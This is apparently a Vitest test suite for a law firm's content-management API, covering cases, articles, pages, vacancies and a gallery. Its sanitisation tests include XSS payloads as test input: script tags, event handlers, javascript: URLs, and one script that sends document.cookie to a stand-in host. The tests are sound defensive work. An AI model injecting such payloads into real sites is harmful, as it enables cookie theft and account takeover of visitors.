import { describe, it, expect } from 'vitest';
import request from 'supertest';
import { app, authedAgent } from './helpers.js';
import CaseModel from '../src/models/Case.js';
import Article from '../src/models/Article.js';

const validCase = {
  title: 'Appeal against a two-year sanction',
  forum: 'CAS',
  year: 2025,
  partyRepresented: 'athlete',
  outcome: 'won',
  summary: 'Sanction reduced on appeal after procedural defects were established.',
};

describe('case CRUD', () => {
  it('creates a case and derives a slug from the title', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/cases').send(validCase);

    expect(res.status).toBe(201);
    expect(res.body.data.slug).toBe('appeal-against-a-two-year-sanction');
    expect(res.body.data.status).toBe('draft');
  });

  it('defaults anonymised to true so party names never publish by accident', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/cases').send(validCase);
    expect(res.body.data.anonymised).toBe(true);
  });

  it('disambiguates a duplicate slug instead of failing the save', async () => {
    const { agent } = await authedAgent();
    await agent.post('/api/cases').send(validCase).expect(201);
    const second = await agent.post('/api/cases').send(validCase);

    expect(second.status).toBe(201);
    expect(second.body.data.slug).toBe('appeal-against-a-two-year-sanction-2');
  });

  it('rejects an invalid enum value', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/cases')
      .send({ ...validCase, partyRepresented: 'dragon' });

    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
    expect(res.body.error.details[0].path).toBe('partyRepresented');
  });

  it('rejects a missing required field', async () => {
    const { agent } = await authedAgent();
    const { forum, ...withoutForum } = validCase;
    const res = await agent.post('/api/cases').send(withoutForum);

    expect(res.status).toBe(400);
  });

  it('strips unknown fields so status cannot be mass-assigned', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/cases')
      .send({ ...validCase, createdBy: 'someone', _id: '000000000000000000000001' });

    expect(res.status).toBe(400); // strict schema rejects rather than silently drops
  });

  it('publishes a case and stamps publishedAt once', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/cases').send(validCase);
    const id = created.body.data._id;

    const published = await agent.patch(`/api/cases/${id}/status`).send({ status: 'published' });
    expect(published.status).toBe(200);
    const firstStamp = published.body.data.publishedAt;
    expect(firstStamp).toBeTruthy();

    await agent.patch(`/api/cases/${id}/status`).send({ status: 'draft' });
    const republished = await agent.patch(`/api/cases/${id}/status`).send({ status: 'published' });

    // Republishing must not reorder the archive.
    expect(republished.body.data.publishedAt).toBe(firstStamp);
  });

  it('keeps a retired slug resolving after a rename', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/cases').send(validCase);
    const id = created.body.data._id;
    await agent.patch(`/api/cases/${id}/status`).send({ status: 'published' });

    await agent.patch(`/api/cases/${id}`).send({ ...validCase, slug: 'renamed-appeal' });

    const doc = await CaseModel.findById(id);
    expect(doc.slug).toBe('renamed-appeal');
    expect(doc.previousSlugs).toContain('appeal-against-a-two-year-sanction');

    // The old URL still resolves, and reports the canonical slug for a 301.
    const res = await request(app).get('/api/public/cases/appeal-against-a-two-year-sanction');
    expect(res.status).toBe(200);
    expect(res.body.meta.redirectTo).toBe('renamed-appeal');
  });

  it('deletes a case', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/cases').send(validCase);
    await agent.delete(`/api/cases/${created.body.data._id}`).expect(204);
    expect(await CaseModel.countDocuments()).toBe(0);
  });
});

describe('article editing', () => {
  it('sanitises script tags out of the body on write', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/articles').send({
      title: 'A dangerous article',
      body: '<p>Safe copy</p><script>alert("xss")</script><img src=x onerror="steal()">',
    });

    expect(res.status).toBe(201);
    const { body } = res.body.data;
    expect(body).toContain('Safe copy');
    expect(body).not.toContain('<script');
    expect(body).not.toContain('onerror');
  });

  it('adds rel=noopener to links in rich text', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/articles').send({
      title: 'Linked article',
      body: '<p><a href="https://example.com">out</a></p>',
    });

    expect(res.body.data.body).toContain('rel="noopener noreferrer"');
  });

  it('strips a javascript: URL', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/articles').send({
      title: 'Sneaky link',
      body: '<p><a href="javascript:alert(1)">click</a></p>',
    });

    expect(res.body.data.body).not.toContain('javascript:');
  });

  it('derives reading time and an excerpt from the body', async () => {
    const { agent } = await authedAgent();
    const words = 'word '.repeat(400);
    const res = await agent.post('/api/articles').send({
      title: 'Long article', body: `<p>${words}</p>`,
    });

    expect(res.body.data.readingMinutes).toBe(2);
    expect(res.body.data.excerpt.length).toBeGreaterThan(0);
  });

  it('hides drafts from the public API but shows them to an admin', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/articles').send({ title: 'Unfinished thoughts' });
    const { slug, _id } = created.body.data;

    await request(app).get(`/api/public/articles/${slug}`).expect(404);
    await agent.get(`/api/articles/${_id}`).expect(200);

    await agent.patch(`/api/articles/${_id}/status`).send({ status: 'published' });
    const now = await request(app).get(`/api/public/articles/${slug}`);
    expect(now.status).toBe(200);
  });

  it('never sends article bodies in a public list response', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/articles').send({
      title: 'Listed article', body: '<p>A very long body that should not travel.</p>',
    });
    await agent.patch(`/api/articles/${created.body.data._id}/status`).send({ status: 'published' });

    const res = await request(app).get('/api/public/articles');
    expect(res.status).toBe(200);
    expect(res.body.data[0].body).toBeUndefined();
  });

  it('paginates', async () => {
    const { agent } = await authedAgent();
    for (let i = 0; i < 5; i += 1) {
      const c = await agent.post('/api/articles').send({ title: `Article number ${i}` });
      await agent.patch(`/api/articles/${c.body.data._id}/status`).send({ status: 'published' });
    }

    const res = await request(app).get('/api/public/articles?limit=2&page=2');
    expect(res.body.data).toHaveLength(2);
    expect(res.body.meta.total).toBe(5);
    expect(res.body.meta.pages).toBe(3);
  });
});

describe('public case archive filtering', () => {
  async function seedCases(agent) {
    const rows = [
      { ...validCase, title: 'CAS athlete 2025', forum: 'CAS', year: 2025, partyRepresented: 'athlete' },
      { ...validCase, title: 'NFF club 2024', forum: 'NFF', year: 2024, partyRepresented: 'club' },
      { ...validCase, title: 'CAS club 2023', forum: 'CAS', year: 2023, partyRepresented: 'club' },
    ];
    for (const row of rows) {
      const c = await agent.post('/api/cases').send(row);
      await agent.patch(`/api/cases/${c.body.data._id}/status`).send({ status: 'published' });
    }
  }

  it('filters by forum', async () => {
    const { agent } = await authedAgent();
    await seedCases(agent);

    const res = await request(app).get('/api/public/cases?forum=CAS');
    expect(res.body.meta.total).toBe(2);
  });

  it('filters by year and party together', async () => {
    const { agent } = await authedAgent();
    await seedCases(agent);

    const res = await request(app).get('/api/public/cases?year=2024&party=club');
    expect(res.body.meta.total).toBe(1);
    expect(res.body.data[0].title).toBe('NFF club 2024');
  });

  it('exposes the distinct filter values', async () => {
    const { agent } = await authedAgent();
    await seedCases(agent);

    const res = await request(app).get('/api/public/cases/filters');
    expect(res.body.data.forums).toEqual(['CAS', 'NFF']);
    expect(res.body.data.years).toEqual([2025, 2024, 2023]);
  });

  it('rejects an out-of-range limit rather than returning everything', async () => {
    const res = await request(app).get('/api/public/cases?limit=9999');
    expect(res.status).toBe(400);
  });
});

describe('page sections are rich text and must be sanitised too', () => {
  // Regression: section bodies live inside an array, so a sanitiser that only
  // walked top-level fields left them raw — a stored XSS on the public site.
  it('strips a script from a section body', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/pages').send({
      title: 'Privacy Policy',
      slug: 'privacy-policy',
      sections: [{
        key: 'body',
        body: '<p>Legitimate policy text.</p><script>fetch("//evil.example?c="+document.cookie)</script>',
      }],
    });

    expect(created.status).toBe(201);
    const stored = created.body.data.sections[0].body;
    expect(stored).toContain('Legitimate policy text.');
    expect(stored).not.toContain('<script');
    expect(stored).not.toContain('evil.example');
  });

  it('strips an event handler from a section body', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/pages').send({
      title: 'About',
      sections: [{ key: 'body', body: '<p onmouseover="steal()">hover me</p>' }],
    });

    expect(res.body.data.sections[0].body).not.toContain('onmouseover');
  });

  it('sanitises across every section, not just the first', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/pages').send({
      title: 'Multi',
      sections: [
        { key: 'intro', body: '<p>fine</p>' },
        { key: 'body', body: '<script>alert(1)</script><p>second</p>' },
      ],
    });

    expect(res.body.data.sections[1].body).not.toContain('<script');
    expect(res.body.data.sections[1].body).toContain('second');
  });

  it('sanitises text nested inside section items', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/pages').send({
      title: 'Items',
      sections: [{ key: 'stats', items: [{ title: 'Cases', text: '<img src=x onerror="alert(1)">120' }] }],
    });

    expect(res.body.data.sections[0].items[0].text).not.toContain('onerror');
  });

  it('leaves a published page clean on the public endpoint', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/pages').send({
      title: 'Privacy Policy',
      slug: 'privacy-policy',
      sections: [{ key: 'body', body: '<p>ok</p><script>alert(1)</script>' }],
    });
    await agent.patch(`/api/pages/${created.body.data._id}/status`).send({ status: 'published' });

    const pub = await request(app).get('/api/public/pages/privacy-policy');
    const body = pub.body.data.sections.find((s) => s.key === 'body').body;
    expect(body).toContain('<p>ok</p>');
    expect(body).not.toContain('<script');
  });
});

describe('careers', () => {
  const vacancy = {
    title: 'Associate, Sports Disputes',
    location: 'Lagos, Nigeria',
    employmentType: 'full_time',
    summary: 'Join the disputes team advising athletes and clubs.',
  };

  it('creates a vacancy as a draft with a generated slug', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/vacancies').send(vacancy);

    expect(res.status).toBe(201);
    expect(res.body.data.slug).toBe('associate-sports-disputes');
    expect(res.body.data.status).toBe('draft');
  });

  it('keeps drafts off the public careers page', async () => {
    const { agent } = await authedAgent();
    await agent.post('/api/vacancies').send(vacancy);

    const pub = await request(app).get('/api/public/vacancies');
    expect(pub.body.data).toHaveLength(0);
  });

  it('lists a published vacancy', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/vacancies').send(vacancy);
    await agent.patch(`/api/vacancies/${created.body.data._id}/status`).send({ status: 'published' });

    const pub = await request(app).get('/api/public/vacancies');
    expect(pub.body.data).toHaveLength(1);
    expect(pub.body.data[0].title).toBe('Associate, Sports Disputes');
  });

  it('drops a closed vacancy from the listing but keeps its page working', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/vacancies').send({
      ...vacancy,
      closingDate: new Date(Date.now() - 86400000).toISOString(), // yesterday
    });
    await agent.patch(`/api/vacancies/${created.body.data._id}/status`).send({ status: 'published' });

    const list = await request(app).get('/api/public/vacancies');
    expect(list.body.data).toHaveLength(0);

    // The link may already be shared, so the page itself must not 404.
    const detail = await request(app).get('/api/public/vacancies/associate-sports-disputes');
    expect(detail.status).toBe(200);
    expect(detail.body.data.isClosed).toBe(true);
  });

  it('keeps a vacancy whose closing date is still ahead', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/vacancies').send({
      ...vacancy,
      closingDate: new Date(Date.now() + 7 * 86400000).toISOString(),
    });
    await agent.patch(`/api/vacancies/${created.body.data._id}/status`).send({ status: 'published' });

    const list = await request(app).get('/api/public/vacancies');
    expect(list.body.data).toHaveLength(1);
  });

  it('sanitises the role description on write', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/vacancies').send({
      ...vacancy,
      description: '<p>Real duties</p><script>alert(1)</script>',
    });

    expect(res.body.data.description).toContain('Real duties');
    expect(res.body.data.description).not.toContain('<script');
  });

  it('rejects an employment type outside the allowed set', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/vacancies').send({ ...vacancy, employmentType: 'wizard' });
    expect(res.status).toBe(400);
  });

  it('refuses a dangerous application link', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/vacancies').send({ ...vacancy, applyUrl: 'javascript:alert(1)' });
    expect(res.status).toBe(400);
  });

  it('lets an editor manage vacancies but not site settings', async () => {
    const { agent } = await authedAgent({ role: 'editor', email: 'recruiter@example.com' });
    await agent.post('/api/vacancies').send(vacancy).expect(201);
    await agent.patch('/api/settings').send({ siteName: 'Nope' }).expect(403);
  });

  it('adds an open vacancy to the sitemap and leaves a closed one out', async () => {
    const { agent } = await authedAgent();

    const open = await agent.post('/api/vacancies').send({ ...vacancy, title: 'Open role' });
    await agent.patch(`/api/vacancies/${open.body.data._id}/status`).send({ status: 'published' });

    const closed = await agent.post('/api/vacancies').send({
      ...vacancy, title: 'Closed role', closingDate: new Date(Date.now() - 86400000).toISOString(),
    });
    await agent.patch(`/api/vacancies/${closed.body.data._id}/status`).send({ status: 'published' });

    const sitemap = await request(app).get('/api/public/sitemap.xml');
    expect(sitemap.text).toContain('/careers/open-role');
    expect(sitemap.text).not.toContain('/careers/closed-role');
  });

  it('counts open roles on the dashboard overview', async () => {
    const { agent } = await authedAgent();
    const created = await agent.post('/api/vacancies').send(vacancy);
    await agent.patch(`/api/vacancies/${created.body.data._id}/status`).send({ status: 'published' });

    const stats = await agent.get('/api/stats');
    expect(stats.body.data.counts.vacanciesOpen).toBe(1);
  });
});

describe('gallery', () => {
  async function makeImage(agent, n = 1) {
    const res = await agent.post('/api/media').send({
      publicId: `pcn-sportiva/gallery-${n}`,
      url: `https://res.cloudinary.com/pkesmajk/image/upload/v1/g${n}.jpg`,
      secureUrl: `https://res.cloudinary.com/pkesmajk/image/upload/v1/g${n}.jpg`,
      format: 'jpg',
      width: 1600,
      height: 1200,
      alt: `Gallery image ${n}`,
    });
    return res.body.data._id;
  }

  it('creates a gallery entry as a draft', async () => {
    const { agent } = await authedAgent();
    const image = await makeImage(agent);

    const res = await agent.post('/api/gallery').send({
      title: 'Signing ceremony',
      description: 'At the federation offices.',
      location: 'Abuja',
      image,
    });

    expect(res.status).toBe(201);
    expect(res.body.data.status).toBe('draft');
    expect(res.body.data.title).toBe('Signing ceremony');
  });

  // An entry without an image would render as an empty tile.
  it('refuses an entry with no image', async () => {
    const { agent } = await authedAgent();
    const res = await agent.post('/api/gallery').send({ title: 'No picture' });

    expect(res.status).toBe(400);
    expect(res.body.error.details.some((d) => d.path === 'image')).toBe(true);
  });

  it('refuses an entry with no title', async () => {
    const { agent } = await authedAgent();
    const image = await makeImage(agent);
    const res = await agent.post('/api/gallery').send({ image });

    expect(res.status).toBe(400);
  });

  it('keeps drafts off the public gallery', async () => {
    const { agent } = await authedAgent();
    const image = await makeImage(agent);
    await agent.post('/api/gallery').send({ title: 'Unpublished', image });

    const pub = await request(app).get('/api/public/gallery');
    expect(pub.body.data).toHaveLength(0);
  });

  it('serves a published entry with its image resolved', async () => {
    const { agent } = await authedAgent();
    const image = await makeImage(agent);
    const created = await agent.post('/api/gallery').send({
      title: 'CAS hearing', description: 'Lausanne.', image,
    });
    await agent.patch(`/api/gallery/${created.body.data._id}/status`).send({ status: 'published' });

    const pub = await request(app).get('/api/public/gallery');
    expect(pub.body.data).toHaveLength(1);
    // The frontend needs the URL and dimensions, not just an id.
    expect(pub.body.data[0].image.secureUrl).toContain('res.cloudinary.com');
    expect(pub.body.data[0].image.alt).toBe('Gallery image 1');
    expect(pub.body.data[0].description).toBe('Lausanne.');
  });

  it('orders by the order field, then newest first', async () => {
    const { agent } = await authedAgent();
    for (const [n, order] of [[1, 2], [2, 0], [3, 1]]) {
      // eslint-disable-next-line no-await-in-loop
      const image = await makeImage(agent, n);
      // eslint-disable-next-line no-await-in-loop
      const created = await agent.post('/api/gallery').send({ title: `Image ${n}`, image, order });
      // eslint-disable-next-line no-await-in-loop
      await agent.patch(`/api/gallery/${created.body.data._id}/status`).send({ status: 'published' });
    }

    const pub = await request(app).get('/api/public/gallery');
    expect(pub.body.data.map((g) => g.title)).toEqual(['Image 2', 'Image 3', 'Image 1']);
  });

  it('caps how many entries a single request can pull', async () => {
    const res = await request(app).get('/api/public/gallery?limit=5000');
    expect(res.status).toBe(200); // capped server-side rather than refused
  });

  it('marks the public gallery as edge-cacheable', async () => {
    const res = await request(app).get('/api/public/gallery');
    expect(res.headers['cache-control']).toMatch(/s-maxage=\d+/);
  });

  it('lets an editor manage the gallery but not site settings', async () => {
    const { agent } = await authedAgent({ role: 'editor', email: 'gallery.editor@example.com' });
    const image = await makeImage(agent);

    await agent.post('/api/gallery').send({ title: 'Editor upload', image }).expect(201);
    await agent.patch('/api/settings').send({ siteName: 'Nope' }).expect(403);
  });

  it('counts published gallery images on the dashboard overview', async () => {
    const { agent } = await authedAgent();
    const image = await makeImage(agent);
    const created = await agent.post('/api/gallery').send({ title: 'Counted', image });
    await agent.patch(`/api/gallery/${created.body.data._id}/status`).send({ status: 'published' });

    const stats = await agent.get('/api/stats');
    expect(stats.body.data.counts.galleryPublished).toBe(1);
  });
});
